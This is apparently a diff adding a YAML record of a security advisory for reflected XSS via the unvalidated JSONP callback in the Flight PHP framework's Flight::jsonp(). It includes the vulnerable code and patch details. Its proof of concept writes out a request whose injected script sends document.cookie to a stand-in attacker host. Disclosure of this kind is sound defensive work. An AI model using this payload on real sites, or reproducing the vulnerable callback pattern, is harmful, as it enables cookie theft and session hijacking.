@@ -1,0 +1,148 @@
+advisory_id: GHSA-fcx8-ph5r-mxr4
+datasource_id: github_osv/GHSA-fcx8-ph5r-mxr4
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-fcx8-ph5r-mxr4/GHSA-fcx8-ph5r-mxr4.json
+aliases:
+  - CVE-2026-42548
+summary: |
+  Flight has reflected XSS through an unvalidated JSONP callback in Flight::jsonp()
+  ### Summary
+  `Flight::jsonp()` concatenates the `?jsonp=` query parameter directly into an `application/javascript` response body without validating that the value is a legal JavaScript identifier. An attacker can inject arbitrary JavaScript that executes in the response origin, enabling reflected cross-site scripting.
+
+  ### Affected code
+  `flight/Engine.php` (≈ lines 1000-1013):
+
+  ```php
+  $callback = $this->request()->query[$param];
+  $this->response()
+      ->status($code)
+      ->header('Content-Type', 'application/javascript; charset=' . $charset)
+      ->write($callback . '(' . $json . ');');
+  ```
+
+  No regex or identifier validation is performed before the callback is written.
+
+  ### Proof of concept
+  Given any route that calls `Flight::jsonp($data)`:
+
+  ```
+  GET /api?jsonp=;window.xss=function(d){fetch('https://attacker.tld/c='+d)};xss(document.cookie);//
+  ```
+
+  Reproduced response (`Content-Type: application/javascript`):
+
+  ```
+  ;window.xss=function(d){fetch('https://attacker.tld/c='+d)};xss(document.cookie);//({"ok":true,"msg":"hello"});
+  ```
+
+  When the vulnerable endpoint is loaded via `<script src="https://victim.tld/api?jsonp=…">` on a page controlled by the attacker, the injected JavaScript executes in the `victim.tld` origin whenever that page is embedded or visited in a same-origin context — cookie theft and session hijack follow.
+
+  ### Impact
+  - Reflected XSS in any application calling `Flight::jsonp()`.
+  - Cookie theft / session hijack when JSONP endpoints are referenced from same-origin pages.
+  - Exfiltration of authenticated API responses.
+
+  ### Patch (fixed in `3.18.1`, commit `b8dd23a`)
+  `_jsonp()` now validates the callback name against `^[A-Za-z_$][\w$.]{0,127}$` before emitting it. An empty callback (no `jsonp` parameter) still behaves as before.
+
+  ### Credit
+  Discovered by **@Rootingg**.
+impacted_packages:
+  - purl: pkg:composer/flightphp/core
+    affected_versions: vers:composer/<3.18.1
+    fixed_versions: vers:composer/3.18.1
+    affected_packages:
+      - pkg:composer/flightphp/core@1.0.0
+      - pkg:composer/flightphp/core@1.1.0
+      - pkg:composer/flightphp/core@1.1.5
+      - pkg:composer/flightphp/core@1.1.10
+      - pkg:composer/flightphp/core@1.2.0
+      - pkg:composer/flightphp/core@1.2.13
+      - pkg:composer/flightphp/core@1.2.14
+      - pkg:composer/flightphp/core@1.2.15
+      - pkg:composer/flightphp/core@1.2.17
+      - pkg:composer/flightphp/core@1.2.18
+      - pkg:composer/flightphp/core@1.2.19
+      - pkg:composer/flightphp/core@1.2.20
+      - pkg:composer/flightphp/core@1.2.21
+      - pkg:composer/flightphp/core@1.2.22
+      - pkg:composer/flightphp/core@1.3.0
+      - pkg:composer/flightphp/core@1.3.1
+      - pkg:composer/flightphp/core@1.3.2
+      - pkg:composer/flightphp/core@1.3.3
+      - pkg:composer/flightphp/core@1.3.4
+      - pkg:composer/flightphp/core@1.3.5
+      - pkg:composer/flightphp/core@1.3.7
+      - pkg:composer/flightphp/core@1.3.8
+      - pkg:composer/flightphp/core@1.3.9
+      - pkg:composer/flightphp/core@2.0.0
+      - pkg:composer/flightphp/core@2.0.1
+      - pkg:composer/flightphp/core@3.0.0
+      - pkg:composer/flightphp/core@3.0.1
+      - pkg:composer/flightphp/core@3.0.2
+      - pkg:composer/flightphp/core@3.1.0
+      - pkg:composer/flightphp/core@3.1.1
+      - pkg:composer/flightphp/core@3.2.0
+      - pkg:composer/flightphp/core@3.3.0
+      - pkg:composer/flightphp/core@3.4.0
+      - pkg:composer/flightphp/core@3.4.1
+      - pkg:composer/flightphp/core@3.4.2
+      - pkg:composer/flightphp/core@3.5.0
+      - pkg:composer/flightphp/core@3.5.2
+      - pkg:composer/flightphp/core@3.5.3
+      - pkg:composer/flightphp/core@3.6.0
+      - pkg:composer/flightphp/core@3.6.1
+      - pkg:composer/flightphp/core@3.6.2
+      - pkg:composer/flightphp/core@3.7.0
+      - pkg:composer/flightphp/core@3.7.1
+      - pkg:composer/flightphp/core@3.7.2
+      - pkg:composer/flightphp/core@3.8.0
+      - pkg:composer/flightphp/core@3.8.1
+      - pkg:composer/flightphp/core@3.9.0
+      - pkg:composer/flightphp/core@3.10.0
+      - pkg:composer/flightphp/core@3.10.1
+      - pkg:composer/flightphp/core@3.11.0
+      - pkg:composer/flightphp/core@3.11.1
+      - pkg:composer/flightphp/core@3.12.0
+      - pkg:composer/flightphp/core@3.13.0
+      - pkg:composer/flightphp/core@3.13.1
+      - pkg:composer/flightphp/core@3.14.0
+      - pkg:composer/flightphp/core@3.15.0
+      - pkg:composer/flightphp/core@3.15.1
+      - pkg:composer/flightphp/core@3.15.2
+      - pkg:composer/flightphp/core@3.15.3
+      - pkg:composer/flightphp/core@3.16.0
+      - pkg:composer/flightphp/core@3.16.1
+      - pkg:composer/flightphp/core@3.17.0
+      - pkg:composer/flightphp/core@3.17.1
+      - pkg:composer/flightphp/core@3.17.2
+      - pkg:composer/flightphp/core@3.17.3
+      - pkg:composer/flightphp/core@3.17.4
+      - pkg:composer/flightphp/core@3.18.0
+    fixed_packages:
+      - pkg:composer/flightphp/core@3.18.1
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '8.6'
+    scoring_system: cvssv4
+    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:H/VI:H/VA:N/SC:L/SI:L/SA:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-fcx8-ph5r-mxr4/GHSA-fcx8-ph5r-mxr4.json
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-79
+references:
+  - url: https://github.com/flightphp/core
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-42548
+    reference_type:
+    reference_id: CVE-2026-42548
+  - url: https://github.com/flightphp/core/security/advisories/GHSA-fcx8-ph5r-mxr4
+    reference_type:
+    reference_id: GHSA-fcx8-ph5r-mxr4
+exploits: []
